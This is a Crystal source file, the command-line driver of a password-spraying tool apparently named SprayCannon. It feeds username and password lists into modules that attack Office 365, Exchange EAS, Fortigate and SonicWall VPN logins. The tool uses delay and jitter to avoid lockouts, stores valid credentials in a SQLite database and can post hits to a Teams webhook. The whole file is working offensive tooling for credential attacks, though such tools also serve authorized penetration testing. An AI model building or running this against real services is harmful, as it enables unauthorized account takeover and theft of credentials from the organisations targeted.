require "option_parser"
require "colorize"
require "sqlite3"

require "./spray_types/sprayer"
require "./spray_types/o365"
require "./spray_types/fortigate"
require "./spray_types/sonicwall_virtualoffice"
require "./spray_types/sonicwall_digest"
require "./spray_types/ExchangeEAS"


# require "./sprayer/smbsprayer"



############
# TODO LOG
############


# Feature requests 
# - timstamp the login, start, end - done!
# - set "spraygroup" or something to spray with no delay for 2 rounds then delay
# - include password list with repo??
# - verbose print out eas 403 means mailbox does not exist and password spray not working

# todo code wise 
# - finish verbose mode 
# - 

# obviously the most important part of the entire tool!!!
art = "
███████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "  █████".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗   ".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "█████".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "███".colorize(:blue).to_s + "╗".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "███".colorize(:blue).to_s + "╗   ".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██████".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "███".colorize(:blue).to_s + "╗".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "
██".colorize(:blue).to_s + "╔════╝".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗ ".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔╝".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔════╝".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "████".colorize(:blue).to_s + "╗  ".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "  ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔═══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "  ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "
███████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╔╝".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╔╝".colorize(:green).to_s + "███████".colorize(:blue).to_s + "║ ╚".colorize(:green).to_s + "████".colorize(:blue).to_s + "╔╝ ".colorize(:green).to_s + "██".colorize(:blue).to_s + "║    ".colorize(:green).to_s + " ███████".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + " ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "
╚════".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔═══╝".colorize(:green).to_s + " ██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "║  ╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╔╝  ".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "     ██".colorize(:blue).to_s + "╔══".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║╚".colorize(:green).to_s + "██".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "
███████".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "     ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "  ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║".colorize(:green).to_s + "  ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "   ██".colorize(:blue).to_s + "║   ╚".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╗".colorize(:green).to_s + "██".colorize(:blue).to_s + "║ ".colorize(:green).to_s + " ██".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║ ╚".colorize(:green).to_s + "████".colorize(:blue).to_s + "║".colorize(:green).to_s + "██".colorize(:blue).to_s + "║ ╚".colorize(:green).to_s + "████".colorize(:blue).to_s + "║╚".colorize(:green).to_s + "██████".colorize(:blue).to_s + "╔╝".colorize(:green).to_s + "██".colorize(:blue).to_s + "║ ╚".colorize(:green).to_s + "████".colorize(:blue).to_s + "║".colorize(:green).to_s + "
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝".colorize(:green).to_s + "
Built by: CausticKibyZ (https://github.com/CausticKirbyZ/SprayCannon)
"



options = {
    "user-as-password" => false,
    "verbose" => false,
    "target" => "",
    "usernames" => [] of String,
    "passwords" => [] of String,
    "delay" => 30,
    "jitter" => 1,
    "webhook" => nil,
    "domain" => "WORKGROUP",
    "db" => true,
    "threads" => 1
}




parser = OptionParser.new() do |opts|
    opts.banner = "\nCLI tool for sprayer crystal lib\n" + 
    "Sprays the target with options for lockout, mfa, jitter, delay.\n" + 
    "    " + "*".colorize(:yellow).to_s + "Not all services can have lockout/mfa detection and it is up to each module to implement it.\n"

    
    opts.separator("Global options:")
    opts.on("-s", "--spray-type=[spraytype]", "Set spray type. (msol(o365), ExchageEAS, vpn_sonicwall_virtualoffice, vpn_sonicwall_digest, vpn_fortinet)") do |type|
        options["spraytype"] = type
    end

    opts.on("-t","--target=[ip/hostname]","Target to spray") do |target|
        options["target"] = target.strip
    end 
    
    opts.on("-u","--username=[name]", "Username or user txt file to spray from") do |uname|
        if File.exists?(uname) 
            File.each_line(uname) do |line|
                options["usernames"].as(Array(String)) << line.strip() # unless line.starts_with?("#")
            end
        else 
            options["usernames"].as(Array(String)) << uname.strip
        end
    end 
    
    opts.on("-p","--password=[password]","Target to spray") do |password|
        if File.exists?(password) 
            File.each_line(password) do |line|
                options["passwords"].as(Array(String)) << line.strip()
            end
        else 
            options["passwords"].as(Array(String)) << password.strip() # unless password.starts_with?("#")
        end
    end 
    
    opts.on("-d","--delay=[time]","time in seconds to delay between password attempts") do |time| 
        options["delay"] = time.to_i
    end
    
    opts.on("-j","--jitter=[time]","time in milliseconds to delay between individual account attempts. default is 1000.") do |time| 
        options["jitter"] = time.to_i
    end

    opts.on("--domain=[domain]","Sets the domain for options that require domain specification.") do |d|
        options["domain"] = d 
    end 

    opts.on("-h", "--help","Print Help menu") do
        puts art
        puts opts
        exit(0)
    end

    opts.on("-v","--verbose","Print verbose information") do
        options["verbose"] = true 
    end

    opts.separator("Additional Options:")

    opts.on("--nodb","does not use the database") do
        options["db"] = false
    end 
    opts.on("--user-as-password","Sets the user and password to the same string") do
        options["user-as-password"] = true
    end 
    opts.on("--webhook=[url]","Will send a teams webhook if valid credential is found!!") do |webhook|
        options["webhook"] = webhook
    end 
    opts.on("--list-spraytypes","List the available spraytypes.") do 
        puts %"msol "
    end 



    opts.invalid_option do |flag|
        STDERR.puts "ERROR: #{flag.colorize(:red).to_s} is not a valid option."
        STDERR.puts opts
        exit(1)
    end
end

if ARGV.size < 1 
    parser.parse(["--help"])
else 
    parser.parse
end

if options["verbose"].as(Bool)
    STDERR.puts options
end




if options["db"].as(Bool)
# open db and set up tables 
db = DB.open "sqlite3://./spray.db"

db.exec "create table if not exists username( usernameid integer primary key autoincrement, username varchar(255) unique not null);"

db.exec "create table if not exists password( passwordid integer primary key autoincrement, password varchar(255) unique not null);"

db.exec "create table if not exists passwords_sprayed(  usernameid integer not null , 
                                                        passwordid integer not null ,
                                                        date_time date,
                                                        primary key(usernameid, passwordid) , 
                                                        foreign key (usernameid) references username(usernameid), 
                                                        foreign key (passwordid) references password(passwordid)                                                        
                                                        );"

db.exec "create table if not exists valid_passwords(    usernameid integer not null , 
                                                        passwordid integer not null ,
                                                        date_time date,
                                                        primary key(usernameid, passwordid) , 
                                                        foreign key (usernameid) references username(usernameid), 
                                                        foreign key (passwordid) references password(passwordid)
                                                     );"
end


# s = Sprayer.new("test", "pass")
# puts options["spraytype"]
case options["spraytype"].as(String).downcase 
when "testing" # this ones just used for testing purposes.... not really a spraytype more fuctionality test 
    s = Sprayer.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
when "vpn_fortinet","vpn_fortigate"
    STDERR.puts "not confirmed to work"
    s = Fortigate.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
when "o365","office365"
    STDERR.puts "Currently in Beta. may not be 100% reliable!!!".colorize(:yellow)
    s = O365.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    s.target = "login.microsoft.com"
    # exit 0 
when "vpncisco" # need to go find a vpn to check it on and port the ruby file  (and find the ruby file )
    STDERR.puts "Not implemented yet"
    # s = VPNCisco.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    exit 0 
when "vpn_sonicwall_digest"
    s = Sonicwall_Digest.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    
when "vpn_sonicwall_virtualoffice"
    s = Sonicwall_VirtualOffice.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
# when "smb"
#     s = SMBsprayer.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
when "exchangeeas"
    s = ExchageEAS.new(options["usernames"].as(Array(String)),options["passwords"].as(Array(String)))
    s.domain = options["domain"].as(String)
else 
    STDERR.puts "Not a valit sprayer type!!".colorize(:red)
    exit 1
end

exit if s.nil?
s.delay = options["delay"].as(Int32)
s.target = options["target"].as(String) unless options["target"] == ""  # unless options["spraytype"].as(String).downcase == "o365"
s.jitter = options["jitter"].as(Int32)
s.webhook_url = options["webhook"].as(String) unless options["webhook"].nil?


if options["user-as-password"]
    # options["passwords"] = options["usernames"]
   s.uap = true
end

# puts "rand: #{max(rand())}"
STDERR.puts "Starting spraying at: #{Time.local.to_s("%Y-%m-%dT%H:%M:%S")}"
STDERR.puts "Spraying...".colorize(:yellow)
STDERR.puts "Username, Password, Valid, Lockout, MFA"

if options["db"].as(Bool)
    s.start(options["threads"].as(Int32), db)
else 
    s.start(options["threads"].as(Int32))
end

STDERR.puts "Done spraying now!!!".colorize(:green)
STDERR.puts "Completed at: #{Time.local.to_s("%Y-%m-%dT%H:%M:%S")}"